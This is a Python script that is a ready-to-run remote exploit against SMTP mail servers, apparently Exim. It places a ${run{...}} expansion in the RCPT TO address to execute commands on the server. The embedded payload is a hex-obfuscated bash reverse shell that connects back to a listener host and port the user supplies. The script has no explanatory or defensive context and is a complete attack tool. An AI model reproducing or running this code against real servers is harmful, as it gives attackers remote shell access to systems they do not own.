#!/usr/bin/python
class Args(object):
    def __init__(self):
        import argparse
        self.parser = argparse.ArgumentParser()

    def parser_error(self, errmsg):
        print("Usage: python " + argv[0] + " use -h for help")
        exit("Error: {}".format(errmsg))

    def parse_args(self):
        self.parser._optionals.title = "OPTIONS"
        self.parser.add_argument('--rhost', help="Server Host", required=True)
        self.parser.add_argument('--rport', help="Server Port", default=25, type=int)
        self.parser.add_argument('--lhost', help='IPv4', required=True)
        self.parser.add_argument('--lport', help='Port', type=int, required=True)
        return self.parser.parse_args()

class Exploit(object):
    def __init__(self, rhost, rport, lhost, lport):
        self._rhost = rhost
        self._rport = rport
        self._lhost = lhost
        self._lport = lport
        self._payload = "\\x2Fbin\\x2Fbash\\x20-c\\x20\\x22bash\\x20-i\\x20\\x3E\\x26\\x20\\x2Fdev\\x2Ftcp\\x2F{0}\\x2F{1}\\x200\\x3E\\x261\\x22".format(lhost.replace('.', '\\x2E'), lport)
        self._run()

    def _ehlo(self):
        return f"EHLO {self._rhost}\r\n"

    def _from(self):
        return "MAIL FROM:<>\r\n"

    def _to(self):
        return f"RCPT TO:<${{run{{{self._payload}}}}}@{self._rhost}>\r\n"

    def _data(self):
        return "DATA\r\n"

    def _body(self):
        return ''.join([f"Received: {i}\r\n" for i in range(1, 32)]) + ".\r\n"

    def _run(self):
        import socket
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.connect((self._rhost, self._rport))
        sock.recv(1024)
        sock.send(self._ehlo().encode())
        sock.recv(1024)
        sock.send(self._from().encode())
        sock.recv(1024)
        sock.send(self._to().encode())
        sock.recv(1024)
        sock.send(self._data().encode())
        sock.recv(1024)
        sock.send(self._body().encode())
        sock.recv(1024)
        print("[+] Exploited. Check your listener")

if __name__ == '__main__':
    args = Args().parse_args()
    Exploit(rhost=args.rhost, rport=args.rport, lhost=args.lhost, lport=args.lport)
